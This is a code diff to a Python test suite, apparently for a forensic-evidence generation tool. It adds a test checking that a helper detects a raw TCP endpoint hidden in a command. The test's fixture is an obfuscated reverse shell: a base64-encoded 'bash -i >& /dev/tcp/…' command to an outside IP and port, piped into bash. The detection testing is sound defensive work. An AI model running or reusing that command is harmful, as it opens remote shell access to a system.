@@ -12,6 +12,7 @@ Covers:
 
 from datetime import datetime
 
+from evidenceforge.generation.engine.storyline import StorylineMixin
 from evidenceforge.models import (
     BaselineActivity,
     Environment,
@@ -67,6 +68,13 @@ class TestUrlExtractor:
     def test_bare_process_name(self):
         cmd = "notepad.exe"
         assert extract_hostnames_from_command(cmd) == set()
+
+    def test_raw_dev_tcp_endpoint_detected_inside_shell_base64(self):
+        cmd = (
+            "bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC80NS4zMy4zMi4zMC84NDQzIDA+JjEi "
+            "| base64 -d | bash'"
+        )
+        assert StorylineMixin._command_contains_raw_tcp_endpoint(cmd, "45.33.32.30", 8443)
 
 
 # ---------------------------------------------------------------------------
